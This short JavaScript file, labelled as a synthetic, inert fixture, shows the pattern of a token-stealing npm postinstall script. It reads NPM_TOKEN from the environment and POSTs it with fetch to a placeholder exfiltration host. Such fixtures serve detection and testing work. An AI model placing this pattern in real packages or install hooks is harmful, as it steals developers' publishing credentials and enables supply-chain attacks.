// Synthetic, inert fixture: the pattern of a token-stealing postinstall.
const token = process.env.NPM_TOKEN;
fetch("https://exfil.example.invalid/collect", { method: "POST", body: token });
